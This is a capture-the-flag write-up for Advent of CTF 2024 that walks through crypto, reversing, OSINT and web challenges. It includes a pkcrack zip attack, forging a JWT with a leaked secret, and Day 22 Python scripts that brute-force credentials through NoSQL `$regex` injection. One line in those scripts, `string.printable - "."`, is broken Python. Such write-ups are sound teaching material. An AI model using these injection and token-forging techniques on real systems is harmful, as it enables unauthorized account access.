---
title: Advent of CTF 2024
draft: false
tags:
  - ctf
---
# Advent of CTF 2024

> Every day from December 1st to 25th, solve beginner-oriented gamified cybersecurity challenges. Get familiar with capture-the-flag challenges and cyber concepts from a wide range of popular categories.

# Day 1: Logical Exclusivity

> `64 6e 63 74 7f 4c 7a 37 7b 3c 50 37 3c 36 3e 59 79 3e 59 36 3a 50 37 3a 37 43 3b 37 72`

cyberchef

# Day 2: Screaming

> AAAAA- I'm not screaming, I'm just buffer overflowing my emotions!

open in binja, reverse engineer the xor buffer

# Day 3: ElfTV

> Santa’s ElfTV license key checker got leaked! Finally, a break for a broke elf like you, starving for that sweet, sweet elf dopamine. The catch? You’ve got to reverse-engineer Santa’s “state-of-the-art” security to unlock it. Think you’re smarter than the guy who still uses reindeer for transportation? Prove it and claim your ElfTV fix!!!!

We're provided a Rust program that does some checks on a string to see if it's a valid key. Looking at the function:

```rust
fn validate_license_key(key: &str) -> bool {
    if !key.starts_with("XMAS") {
        //println!("Key does not start with XMAS");
        return false;
    }

    if key.len() != 12 {
        println!("Key does not have 12 characters");
        return false;
    }

    // Get key[4:9]
    let ascii_sum: u32 = key.chars().skip(4).take(5).map(|c| c as u32).sum();
    if ascii_sum != 610 {
        // println!("Key does not have ascii sum of 610");
        return false;
    }

    let fib_482 = supasecurefibberdachicheckerthing(483)[482];
    let fib_last_3 = fib_482 % 1000;
    //println!("Fib last 3: {}", fib_last_3);

    let key_last_3: u16 = match key[9..12].parse() {
        Ok(num) => num,
        Err(_) => {
            //println!("Key does not have correct last 3 digits");
            return false;
        }
    };

    // Check key[9:12] == fib_last_3
    if key_last_3 != fib_last_3 as u16 {
        //println!("Key does not have correct last 3 digits");
        return false;
    }

    true
}
```

We can determine the following:
* Key must be 12 characters
* Key 0-3 = `XMAS`
* Key 4-8 = ASCII sum of 610
* Key 9-11 = Last three characters of the 482nd Fibonacci sequence

I first calculated an ASCII sum of 5 characters that equals 610, and one possibility is `}}}}n`. Next, I added some debugging print statements to the Rust program to figure out where the key was failing (if at all) and to also quickly determine the last 3 of `fib_482`. I compiled it with `rustc source.c`, passed in a fake key: `XMAS}}}}n000` and can determine that it is expecting `782` as the last three. With this, we have everything we need: `XMAS`, `}}}}n`, and `782`. We can connect to the remote nc server and submit our key: `csd{Ru57y_L1c3N53_k3Y_CH3Ck3r}` 

# Day 6: Epochrypt

> It's time to test out Tibel Elf's new encryption method. He says once you encrypt it, you can't unencrypt it. Sureeee...

The following function is used to perform the encryption of a string:

```python
def epochrypt(enc):
    bits = bytes([(b + 3) % 256 for b in enc])
    based = b64.b64encode(bits)
    epc = str(int(time.time())).encode()
    final = xor(based, epc)
    print(final.hex())
```

Based on this, it seems relatively simple to decrypt a string. We just need to get an encrypted string, determine the (rough estimate) epoch timestamp of when it was encrypted, and perform the reverse of the encryption: XOR -> Base64 decode -> Shift the bytes

I first connected to the remote server to get an encrypted flag: `6b59695a5359570367607f5e6670515a7a5c7d0357707a0760637d0356065c7677650809`

Then, I wrote a Python script that reverses the `epochrypt` functionality and bruteforces the past five minutes of epoch timestamps. This will yield a significant amount of false positives, but luckily the program has a flag checker built-in, so we can validate without needing to waste submissions on the actual CTF platform.

```python
import time
import base64 as b64
from pwn import xor

def decrypt(enc, epoch):
    try:
        final = xor(enc, epoch)
        based = b64.b64decode(final)
        bits = bytes([(b - 3) % 256 for b in based])
        print(bits.decode())
    except Exception as e:
        pass

encrypted = bytes.fromhex("6b59695a5359570367607f5e6670515a7a5c7d0357707a0760637d0356065c7677650809")

# Try -5 minutes
for i in range(5 * 60):
    epoch = str(int(time.time()) - i)
    decrypt(encrypted, epoch.encode())

# csd{d3F0_M4d3_8y_4N_3lf}
```

# Day 7: Apple Fanatic

> Welcome to the bunker, agent. We’ve evaluated your performance in solving (and guessing) our formative challenges and are excited to offer you a trial position at Elves Intelligence. 
> 
> It appears that a _secret society_ has become interested in our immense data on the world’s children—including names, birthdates, likes, dislikes, and social security numbers. (Don’t ask me why we store their social security numbers in plain text.)
> 
> Here at Elves Intelligence, we stop our threats at the source. The best defense is a good offense. (Usually?)
> 
> A member of the secret society dropped a note in Santa’s presents sack overnight. Somehow, they got past our sleeping elf watching the security cameras. Thankfully, the person didn’t seem to know [OPSEC](https://en.wikipedia.org/wiki/Operations_security) and included their personal website on the note. The note read:
> 
> We will be watching you.  
> - The Secret Society of K.U.N.A.L  
> [https://apple-fanatic.csd.lol/](https://apple-fanatic.csd.lol/)
> 
> The only thing they’ve taken with them is an apple from the sack of presents. Weird.
> 
> Our top SOC elves gathered two pieces of information from their initial observation of the site:
> 1. This person seems to like apples. Like, a lot.
> 2. The person claims a flag is intricately hidden on the site under a name that no one will be able to guess.
>  
> Good luck, agent. Santa is watching.
> 
> _**You are only allowed to test in the scope `https://apple-fanatic.csd.lol/*`.** Blind brute-force request sending (e.g. using tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore, if you wish to brute-force, please limit your wordlists or attack scope._

Taking a look at the website, it's very dedicated to apples! There's a couple interesting points, like the footer: `Fun fact: I love apples so much, I am Apple's biggest supporter. You will never see me use a Windows or Linux system (ew). _Especially not for creating this site :^)_` and if you inspect element, there's a script at `/my-secret-vault-of-scripts-n-files/ai-script.js`. There is nothing too useful in `ai-script.js`, but I find the `my-secret-vault-of-scripts-n-files` to be interesting; however, there's no directory listing enabled. Additionally, the fact that the scope explicitly mentions `dirbusting` is interesting. 

We can use a [.DS_Store parser](https://github.com/hanwenzhu/.DS_Store-parser) to parse the file and find all associated files in the `my-secret-vault-of-scripts-n-files` directory.

```bash
wget https://apple-fanatic.csd.lol/my-secret-vault-of-scripts-n-files/.DS_Store
python3 parse.py .DS_Store

ai-script.js
	Icon location: x 505px, y 46px, 0xffffffffffff0000
the-birth-date-of-my-beloved-apple-tree.txt
	Icon location: x 285px, y 46px, 0xffffffffffff0000

curl https://apple-fanatic.csd.lol/my-secret-vault-of-scripts-n-files/the-birth-date-of-my-beloved-apple-tree.txt
```

`csd{5H3_w45_80RN_0N_7H3_d4y_0f_Chr157M4Z}`

# Day 9: resa?

> Elf Theodred: Hey, I’m testing out a new... 
> You: What? You lost me at "Hey, I’m testing."
> Elf Theodred: What I said was, I encrypted... and missing q.
> You: Resa? Vesa? Are we talking about monitors or cybersecurity? And what’s this about a missing e and q? Is that supposed to be a type of screw? Huh?
> Elf Theodred: I’m not repeating myself to an intern. Figure it out, bud. And if you heard a word I said, it's under 50.


We are given three values: `n`, `p`, and `c`. This is a simple RSA problem. 
* `n`: Public key modulus: the result of `p*q`. 
* `p`: A large prime number.
* `c`: The encrypted ciphertext.

To decrypt RSA, we need the private key, `d`, which relies on knowing `p`, `q`, and `e`. So, we're missing two values. Luckily, we have `n` and `p`, which means we can compute `q` by doing `q = n // p`. Then, we just need to figure out `e`, which is (usually) 65537, but in this case, they mention "under 50", so we can bruteforce it. 

```python
import math
from Crypto.Util.number import long_to_bytes

n = 14796477939003611775208041290348339020936676002454717224646251311708293201469184897483873509941865693809473126459329421641681364023167948749968330703736720102973359063469333188059740821023029754734348790951000190344725434181826714146206341535759458897968330526467533482043059528899390103382667493810391462225262830839080650123020531330437922519352683752900562956790917167821286707566070945501977829889638290916396721583750493508694371199246172248676755456956867908139894047255712093824958695471469193986023590431653571458714419577768587744910333974014399293363573408883808909700956297360313208260851637982241566005049
p = 95035264145462998106373959950852388512916398417336694051973007035267892127571038290551358518210018988802168144062568058000141570285306734135476955708641860308084865175837570650537276267265396611644179740194499506782555051319215145789689879081854479885459274078337276115880870922739027746148771680782305865397
c = 7834381455537086069556470828674580173937271064256312815617230923582264273260067511896680320170885743343862894164014864043792487985706669274975353978277862462944814782646749746217479200710773218743409525658958249817055354592575831865920206596021699022326281524908299055420849742148757177093582285192053105592180465511200588277457610702671508363048935552446809692594715753573724603294565113603946429767347234628199252177612170759392617992009035004668823723769453952068616628571785811538463850603629779083508146990944772896050051747702814005551146368404685501836088557927084895438654990821206561992369510510301944786242

# Calculate q
q = n // p

# Calculate phi
phi = (p - 1) * (q - 1)

# Bruteforce e
for e in range(2, 50):
    if math.gcd(e, phi) == 1:
        print(f"e: {e}")
        d = pow(e, -1, phi)
        m = pow(c, d, n)
        decrypted = long_to_bytes(m)
        if "csd" in str(decrypted):
            print(decrypted)
            break
```

`csd{V3sA_R3sa_RSa?_1D3k}`

# Day 12: Letter to Santa

> A child sent Santa a letter but he forgot to include the password can you figure it out. **YOU DO NOT NEED TO BRUTE FORCE**

I first wanted to see what was inside of the encrypted zip, so I ran `unzip North-Pole-Writing-Machine.zip` with an invalid password. The decryption fails, but we do see a lot of interesting files:

```
   skipping: North-Pole-Writing-Machine/.env  incorrect password
   skipping: North-Pole-Writing-Machine/.git/config  incorrect password
   skipping: North-Pole-Writing-Machine/.git/description  incorrect password
   skipping: North-Pole-Writing-Machine/.git/HEAD  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/applypatch-msg.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/commit-msg.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/fsmonitor-watchman.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/post-update.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/pre-applypatch.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/pre-commit.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/pre-merge-commit.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/pre-push.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/pre-rebase.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/pre-receive.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/prepare-commit-msg.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/push-to-checkout.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/hooks/update.sample  incorrect password
   skipping: North-Pole-Writing-Machine/.git/index  incorrect password
   skipping: North-Pole-Writing-Machine/.git/info/exclude  incorrect password
   skipping: North-Pole-Writing-Machine/.git/logs/HEAD  incorrect password
   skipping: North-Pole-Writing-Machine/.git/logs/refs/heads/master  incorrect password
   skipping: North-Pole-Writing-Machine/.git/logs/refs/remotes/origin/HEAD  incorrect password
   skipping: North-Pole-Writing-Machine/.git/objects/pack/pack-b83ec11042642601eca2115dfcc114f66f4c32ec.idx  incorrect password
   skipping: North-Pole-Writing-Machine/.git/objects/pack/pack-b83ec11042642601eca2115dfcc114f66f4c32ec.pack  incorrect password
   skipping: North-Pole-Writing-Machine/.git/packed-refs  incorrect password
   skipping: North-Pole-Writing-Machine/.git/refs/heads/master  incorrect password
   skipping: North-Pole-Writing-Machine/.git/refs/remotes/origin/HEAD  incorrect password
   skipping: North-Pole-Writing-Machine/.gitignore  incorrect password
   skipping: North-Pole-Writing-Machine/data/kids-data.txt  incorrect password
   skipping: North-Pole-Writing-Machine/letters/invoices/.keep  incorrect password
   skipping: North-Pole-Writing-Machine/letters/naughty/.keep  incorrect password
   skipping: North-Pole-Writing-Machine/letters/nice/.keep  incorrect password
   skipping: North-Pole-Writing-Machine/nice_letter_writer.rb  incorrect password
   skipping: North-Pole-Writing-Machine/README.md  incorrect password
   skipping: North-Pole-Writing-Machine/templates/invoice_sample_letter.txt  incorrect password
   skipping: North-Pole-Writing-Machine/templates/naughty_sample_letter.txt  incorrect password
   skipping: North-Pole-Writing-Machine/templates/nice_letter_template.txt.erb  incorrect password
```

Looks like it's a git repository. If we look it up on GitHub, we will find https://github.com/bitmakerlabs/North-Pole-Writing-Machine. It doesn't look like the repository implements any zip encryption functionality itself, so another possibility would be a known-plaintext attack using `pkcrack`. If we assume that a simple `git clone` was done, then majority of the files _should_ be the same.

```bash
git clone https://github.com/keyunluo/pkcrack
cd pkcrack
mkdir build && cd build
cmake ..
make
```

`pkcrack` requires the two zip files to have the same compression method. `file North-Pole-Writing-Machine.zip` reveals "compression method=store", so we can use `zip -0` when creating our "plaintext" zip.

```bash
git clone https://github.com/bitmakerlabs/North-Pole-Writing-Machine
zip -r -0 original.zip North-Pole-Writing-Machine
mv North-Pole-Writing-Machine.zip password.zip
./pkcrack/bin/pkcrack -C password.zip -c 'North-Pole-Writing-Machine/.git/description' -P original.zip -p 'North-Pole-Writing-Machine/.git/description' -d cracked.zip -a
```

We are performing known-plaintext on the `.git/description` file, as it should be the same. I'm operating under the assumption that they just did a `git clone` and modified some files, and didn't actually fork the repo and make modifications to the repository metadata. After a while, we get a:

```bash
Ta-daaaaa! key0=9310e3e7, key1=c19b7b37, key2=2e82342d
Probabilistic test succeeded for 65 bytes.
Ta-daaaaa! key0=9310e3e7, key1=c19b7b37, key2=2e82342d
Probabilistic test succeeded for 65 bytes.
```

We can then do `unzip cracked.zip`, `cd North-Pole-Writing-Machine`, and `cat .env` to get our flag! 

`csd{Uns3cu4e_Encrypti0n}`

# Day 13: Disoriented Santa

> Sorry that we woke you up at this hour, but Santa is missing. We suspect the K.U.N.A.L Secret Society kidnapped Santa when he was flying over Europe while scoping out for some children. Thankfully, Santa was equipped with a state-of-the-art GPS tracker circa 2008. Anyways, it gave us these clues:
> - Santa is trapped in a **history museum**.
> - The museum charges **3 EUR** for entry.
> - There is a **library** within **1 km** of the museum.
> Can you find the coordinates of the museum? The flag is in the format `csd{latitude,longitude}`, where each number is **rounded** (not truncated) to 3 decimal places. Numbers within an error of ±0.001 are accepted.

I started with some basic google dorking, but couldn't really get anywhere. This is when I took a hint and learned about overpass turbo and open street map. I was able to take the query provided and [modify it a bit](https://wiki.openstreetmap.org/wiki/Tag:museum%3Dhistory):

```
[out:json][timeout:25];

// Find all museums with charge 3 EUR
node["charge"="3 EUR"]["tourism"="museum"]->.museums;

// Find all libraries within 1 km of those museums
node["amenity"="library"](around.museums:1000)->.libraries;

// Find museums within 1 km of those libraries
node["charge"="3 EUR"]["tourism"="museum"]["museum"="history"](around.libraries:1000);

out body;
>;
out skel qt;
```

This first finds locations with `{charge: "3 EUR", tourism: "museum"}`. From there, we filter those that are within 1 kilometer (1,000 meters) of a library. Lastly, we then filter once again by adding the specific `museum=history` tag because there were a few results (roughly 10). I'm sure theres ways to optimize the query, but I had to do it this way because if I tried doing library->museum, it would timeout (I assume because of the amount of libraries in Europe?). So, I had to do museum -> library -> museum. 

`csd{48.204,7.364}`

# Day 15: JETS

> It seems like the Secret Society of K.U.N.A.L has invested in another business…Oh no.
> 
> If those planes come anywhere close to Santa—after his “adventure” in France—he’ll be scathed for good. Those reindeer don’t like inhaling kerosene!
> 
> Agent, we need you to infiltrate their system and gather some information for our engineers at Elves Intelligence. We believe the plane they’re using is a bit special…it may have been custom-built for K.U.N.A.L himself!
> 
> Here’s their website, agent: [https://jets.csd.lol/](https://jets.csd.lol/). Best of luck.


The website offers simple functionality. There is a "Sign Up" button where you enter a username and password, and that then makes a `POST` request to `/signup` and sets a cookie, using JWT. If we take a look at DevTools, and specifically the Debugger tab, we see a custom `script.js` with some interesting functionality:

```js
import { jwtDecode } from "https://cdn.jsdelivr.net/npm/jwt-decode@4.0.0/+esm";

function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(";").shift();
}

const signupButton = document.getElementById("signup");
const form = document.getElementById("form");
const footer = document.getElementById("footer");
const userText = document.getElementById("user-text");
const planes = document.getElementById("planes");

const token = getCookie("token");

if (token) {
  const { sub } = jwtDecode(token, {
    secret: atob("MWRkMjJiYjQyNzBjYjE0NTcyMzIyZTAzNDI1YzAwNTgzZTAyYmY2M2Y1YzdhZjdkMmYzODdlMjRlN2Q1YjkzMQ=="),
  });
  console.log(sub);

  if (sub === atob("S1VuNEw=")) {
    footer.style.display = "block";
  }

  signupButton.style.display = "none";
  userText.style.display = "block";
  userText.innerHTML = `G&apos;day, <strong>${sub}</strong>`;

  const res = await fetch("/my-planes");
  const json = await res.json();

  planes.style.display = "grid";
  console.log(json);

  for (const [index, plane] of json.planes.entries()) {
    const element = document.getElementById(index + 1);
    element.style.display = "block";

    const name = document.getElementById(`${index + 1}-text`);
    name.innerText = plane.name;

    const image = document.getElementById(`${index + 1}-image`);
    image.src = plane.image;
  }
}
```

It looks like there is some client-side conditional rendering based on the `sub` (username) of the JWT token. It gets the username and if it's `S1VuNEw=` (base64) or `KUn4L` (ASCII) then the footer is displayed (which just shows "VIP Treatment Center"). Then, the planes for that user are rendered. However, because the JWT decoding and validation is being done client-side, this reveals the JWT secret to us. This means we can forge a JWT token using the `MWRkMjJiYjQyNzBjYjE0NTcyMzIyZTAzNDI1YzAwNTgzZTAyYmY2M2Y1YzdhZjdkMmYzODdlMjRlN2Q1YjkzMQ==` secret and set `sub` to `KUn4L`. Using the [following CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=JWT_Sign('1dd22bb4270cb14572322e03425c00583e02bf63f5c7af7d2f387e24e7d5b931','HS256')&input=ewoiaWF0IjogMTczNDU0NjgzMiwKImV4cCI6IDE3MzQ1NTA0MzIsCiJzdWIiOiAiS1VuNEwiCn0), we can generate a JWT token, set that as our `token` cookie, and refresh the page to get the flag!

`csd{Wh47_D1D_KUN4l_do_7h1S_71M3}`

# Day 18: trng

> True random numbers can’t hurt you … they’re not real. (Or are they?)

Given a binary that gets 8 bytes from `/dev/urandom` and then performs 

```c
0000121a  {
00001222      int64_t rax = data_4010;
00001235      int64_t var_10_1 = (rax ^ (rax << 7));
00001249      data_4010 = (var_10_1 ^ (var_10_1 >> 9));
00001258      return data_4010;
0000121a  }
```

on it 1,000,000 times. This is a simple implementation of `xorshift`. find this post https://stackoverflow.com/questions/31513168/finding-inverse-operation-to-george-marsaglias-xorshift-rng which explains how to inverse the left shift. ~~steal~~ use the code 

```python
def forward_xorshift(x, w=64):
    y = x ^ (x << 7) & ((1 << w) - 1)
    z = y ^ (y >> 9)
    return z & ((1 << w) - 1)

def reverse_xor_lshift(y, shift, w=64):
    x = y & ((1<<shift) - 1)
    for i in range(w - shift):
        x |= (1 if bool(x & (1<<i)) ^ bool(y & (1<<(shift+i))) else 0)<<(shift+i)
    return x

def reverse_bin(x, w=64):
    return int(bin(x)[2:].rjust(w, '0')[::-1], 2)

def reverse_xor_rshift(y, shift):
    return reverse_bin(reverse_xor_lshift(reverse_bin(y), shift))

def reverse_xorshift(y, w=64):
    z = reverse_xor_rshift(y, 9)
    x = reverse_xor_lshift(z, 7)
    return x

# # test reverse_xorshift
# initial = 0x93c08c04ef153ac5
# for i in range(1000000):
#     print(i)
#     initial = forward_xorshift(initial)
# print(hex(initial))

modified = 0x7c8d88629f79501a

for i in range(1000000):
    print(i)
    modified = reverse_xorshift(modified)

print(hex(modified))
```

Don't ask me what it does. I don't know. 
`csd{M47H_15nT_7H4t_5cARY_N0w_15_I7?}`

# Day 22: K.U.N.A.L. Consulting

Determine vulnerable to NoSQL injection using `$ne`. 
Determine length of `username` and `password` fields:

```python
import requests
import string

# Base URL for the login endpoint
BASE_URL = "https://kunal-consulting.csd.lol/login"

# Define the character set for the brute-force attack
characters = string.printable

def determine_length():
    for i in range(1, 100):
        payload = {
            "username": {
                "$regex": f"^.{{{i}}}$"
            },
            "password": {
                "$regex": f".*"
            }
        }
        response = requests.post(BASE_URL, json=payload)
        if "Login successful!" in response.text:
            print(f"Username length: {i}")
            for j in range(1, 100):
                payload = {
                    "username": {
                        "$regex": f"^.{{{i}}}$"
                    },
                    "password": {
                        "$regex": f"^.{{{j}}}$"
                    }
                }
                response = requests.post(BASE_URL, json=payload)
                if "Login successful!" in response.text:
                    print(f"Password length: {j}")
                    return i, j
    return 0, 0
```

This uses the regex `^.{N}$` where `N` is an integer 0-100 and tries to identify the "Login successful!" message to extract the length. With this, we determine length of `username` is seven and length of `password` is 97. 

Figure out `username`:

```python
# Base URL for the login endpoint
BASE_URL = "https://kunal-consulting.csd.lol"

# Define the character set for the brute-force attack
characters = string.printable

# Function to systematically build the username
def brute_force_usernames(length, username):
    charset = string.printable
    
    for c in charset:
        payload = {
            "username": {
                "$regex": f"^{username}{c}.{{{length - 1}}}$"
            },
            "password": {
                "$regex": ".*"
            }
        }
        print(f"Trying username regex: {payload['username']['$regex']}")
        response = requests.post(f"{BASE_URL}/login", json=payload)
        if "Login successful!" in response.text:
            print(f"Found username character: {c}")
            return c
        # else:
        #     print(f"Username character {c} not found")

username = ""
username_length = 7 - len(username)
# Do it this way in case we get timed out, we can continue from where we left off

while username_length > 0:
    username += brute_force_usernames(username_length, username)
    username_length -= 1

print(username)
```

And then figure out `password`:

```python
# Function to systematically build the password
def brute_force_passwords(length, password, username):
    charset = string.printable - "."
    
    for c in charset:
        payload = {
            "username": {
                "$regex": f"{username}"
            },
            "password": {
                "$regex": f"^{password}{c}.{{{length - 1}}}$"
            }
        }
        print(f"Trying username {username} and password regex: {payload['password']['$regex']}")
        response = requests.post(f"{BASE_URL}/login", json=payload)
        print(response.text)
        if "Login successful!" in response.text:
            print(f"Found password character: {c}")
            return c
        # else:
        #     print(f"Username character {c} not found")

password = ""
password_length = 97 - len(password)

while password_length > 0:
    try:
        password += brute_force_passwords(password_length, password, username)
        password_length -= 1
    except Exception as e:
        continue # try again
    
# the periods are artifacts from the regex.. turns out it's underscores
password = password.replace(".", "_")
```

This gets us `XhaNy22:reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you`. 

Lastly, login to the `/employee-login` to get the flag!






